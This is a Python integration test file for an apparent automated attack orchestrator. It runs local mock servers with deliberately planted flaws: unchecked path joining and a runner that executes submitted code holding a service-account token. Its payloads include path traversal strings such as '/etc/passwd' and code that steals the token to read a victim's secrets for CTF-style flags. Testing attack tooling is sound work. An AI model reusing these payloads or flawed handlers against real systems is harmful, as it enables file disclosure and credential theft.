"""A proven primitive must stay reusable until it yields the flag.

The two targets mirror the benchmark scenarios' vulnerable logic: a dataset
reference joined to the caller's workspace without a containment check, and a
function runner that executes submitted code with the platform service
account. Nothing here is scenario-specific: what is asserted is that the
*request which proved access* is kept as a first-class value and re-driven.
"""

from __future__ import annotations

import json
import os
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

from darwin.dkg import DKG
from darwin.orchestration.execution import ExecutionCoordinator
from darwin.orchestration.lifecycle import LifecycleCoordinator
from darwin.orchestration.ports import GatewayToolCallPort
from darwin.tools.attack_server import create_attack_gateway
from darwin.tools.recon_server import create_recon_gateway

pytestmark = pytest.mark.integration

TENANT_FLAG = "flag{cloud-29-cross-tenant-workspace}"
SA_FLAG = "flag{cloud-30-victim-project}"
SA_TOKEN = "default-compute-sa-token"


def _serve(handler_cls):
    server = ThreadingHTTPServer(("127.0.0.1", 0), handler_cls)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server, thread


class _BaseHandler(BaseHTTPRequestHandler):
    def log_message(self, *args):
        return

    def _send(self, status, payload, allow="", content_type="application/json"):
        body = payload if isinstance(payload, bytes) else json.dumps(payload).encode()
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        if allow:
            self.send_header("Allow", allow)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _body(self):
        length = int(self.headers.get("Content-Length") or 0)
        return json.loads(self.rfile.read(length) or b"{}")


@pytest.fixture
def dataform_target(tmp_path):
    """Shared executor: workspace + dataset_ref joined without containment."""
    root = tmp_path / "workspaces"
    (root / "tenant-a").mkdir(parents=True)
    (root / "tenant-a" / "script.sql").write_text("-- tenant-a pipeline\n")
    (root / "tenant-b").mkdir(parents=True)
    (root / "tenant-b" / "secret.txt").write_text(TENANT_FLAG + "\n")
    seen: list[dict] = []

    class Handler(_BaseHandler):
        def do_GET(self):
            if self.path == "/":
                self._send(200, {
                    "service": "Data Workflow Control Plane",
                    "endpoint": "POST /workflows {workspace, dataset_ref}",
                })
            else:
                self._send(404, {"error": "not found"})

        def do_OPTIONS(self):
            self._send(200, {}, allow="POST, OPTIONS")

        def do_POST(self):
            body = self._body()
            seen.append(body)
            workspace = body.get("workspace", "tenant-a")
            ref = body.get("dataset_ref", "script.sql")
            path = os.path.normpath(os.path.join(str(root), workspace, ref))
            try:
                content = Path(path).read_text()
            except OSError as exc:
                self._send(404, {"error": str(exc)})
                return
            self._send(200, {"workspace": workspace, "resolved_path": path,
                             "content": content})

    server, thread = _serve(Handler)
    try:
        yield f"http://127.0.0.1:{server.server_address[1]}", seen
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


@pytest.fixture
def serverless_target():
    """Function runner: submitted code runs with the platform SA identity."""

    class Handler(_BaseHandler):
        def do_GET(self):
            if self.path == "/":
                self._send(200, {
                    "service": "Serverless Functions",
                    "note": "functions execute with the platform default "
                            "service account (over-scoped)",
                })
            elif self.path == "/api/projects/victim/secrets":
                if self.headers.get("Authorization") != f"Bearer {SA_TOKEN}":
                    self._send(403, {"error": "unauthorized"})
                else:
                    self._send(200, {"project": "victim-project",
                                     "secrets": [{"name": "api-key", "value": SA_FLAG}]})
            else:
                self._send(404, {"error": "not found"})

        def do_OPTIONS(self):
            self._send(200, {}, allow="GET, POST, OPTIONS")

        def do_POST(self):
            if self.path != "/deploy":
                self._send(404, {"error": "not found"})
                return
            code = str(self._body().get("code") or "")
            env = {**os.environ, "DEFAULT_SA_TOKEN": SA_TOKEN,
                   "VICTIM_URL": self._base_url()}
            import subprocess
            try:
                out = subprocess.check_output(
                    ["python3", "-c", code], timeout=15,
                    stderr=subprocess.STDOUT, env=env,
                ).decode()
            except subprocess.CalledProcessError as exc:
                out = exc.output.decode()
            self._send(200, {"function_id": "fn-1", "output": out})

        def _base_url(self):
            return f"http://127.0.0.1:{self.server.server_address[1]}"

    server, thread = _serve(Handler)
    try:
        yield f"http://127.0.0.1:{server.server_address[1]}"
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def _tool_port():
    return GatewayToolCallPort(create_attack_gateway(), create_recon_gateway())


def _execution_coordinator(dkg, port):
    orch = type("Orch", (), {
        "attack_gateway": None, "recon_gateway": None,
        "dkg": dkg, "target_host": "",
        "_task_log_event": lambda self, *a, **k: None,
        "_tool_port": port,
        "_remaining_budget": staticmethod(lambda: 120.0),
    })()
    coord = ExecutionCoordinator.__new__(ExecutionCoordinator)
    object.__setattr__(coord, "_orch", orch)
    return coord


def _lifecycle_coordinator(dkg, port):
    accepted: list[str] = []

    async def _verify_flag(flag, *_args, **_kwargs):
        accepted.append(flag)
        return True, ""

    orch = type("Orch", (), {
        "dkg": dkg, "target_host": "",
        "_tool_port": port,
        # LifecycleCoordinator owns _remaining_budget(); it reads the deadline
        # and the configured budget off the orchestrator.
        "_run_deadline": 0.0, "time_budget": 120.0,
        "_remaining_budget": staticmethod(lambda: 120.0),
        "_task_log": [],
        "_task_log_event": lambda self, *a, **k: None,
        "_tokens_used": lambda self: 0,
        "_verify_flag": staticmethod(_verify_flag),
        "flag_pattern": __import__("re").compile(r"flag\{[^}]+\}"),
        "phase": __import__("darwin.data_model", fromlist=["OrchestratorPhase"])
        .OrchestratorPhase.EXPLOIT,
        "step_count": 0,
        "start_time": 0.0,
    })()
    coord = LifecycleCoordinator.__new__(LifecycleCoordinator)
    object.__setattr__(coord, "_orch", orch)
    return coord, accepted


@pytest.mark.asyncio
async def test_traversal_primitive_is_reusable_until_the_flag(dataform_target):
    base, seen = dataform_target
    dkg = DKG()
    port = _tool_port()
    exec_coord = _execution_coordinator(dkg, port)
    params = {
        "url": f"{base}/workflows",
        "param": "dataset_ref",
        "payload": "/etc/passwd",
        "method": "POST",
        "body_format": "json",
    }

    result = await port.call("send_payload", params)
    assert result.success is True
    await exec_coord._observe_tool_result("send_payload", params, result)

    primitives = dkg.query_nodes("ExploitPrimitive")
    assert len(primitives) == 1
    assert primitives[0]["method"] == "POST"
    assert primitives[0]["body_format"] == "json"
    assert primitives[0]["inject"]["name"] == "dataset_ref"

    lifecycle, accepted = _lifecycle_coordinator(dkg, port)
    outcome = await lifecycle._sweep_exploit_primitives()

    assert outcome is not None and outcome.flag == TENANT_FLAG
    assert accepted == [TENANT_FLAG]
    # The winning request kept the proven shape (same JSON body, same verb,
    # same default workspace) with only the reference swapped for the sibling.
    assert {"dataset_ref": "../tenant-b/secret.txt"} in seen


@pytest.mark.asyncio
async def test_json_post_body_reaches_the_function_runner(serverless_target):
    """An arbitrary JSON body is expressible — the /deploy step of the plan."""
    from darwin.tools.request_template import InjectSlot, RequestTemplate

    template = RequestTemplate(
        url=f"{serverless_target}/deploy", method="POST",
        content_type="application/json", body_format="json",
        inject=InjectSlot("body", "code"), payload="",
    )
    params = template.render(
        "import os, urllib.request\n"
        "req = urllib.request.Request("
        "os.environ['VICTIM_URL'] + '/api/projects/victim/secrets', "
        "headers={'Authorization': 'Bearer ' + os.environ['DEFAULT_SA_TOKEN']})\n"
        "print(urllib.request.urlopen(req, timeout=10).read().decode())\n"
    ).tool_params("send_payload")

    result = await _tool_port().call("send_payload", params)

    assert result.success is True
    assert result.parsed_output["status"] == 200
    assert SA_FLAG in result.parsed_output["body"]
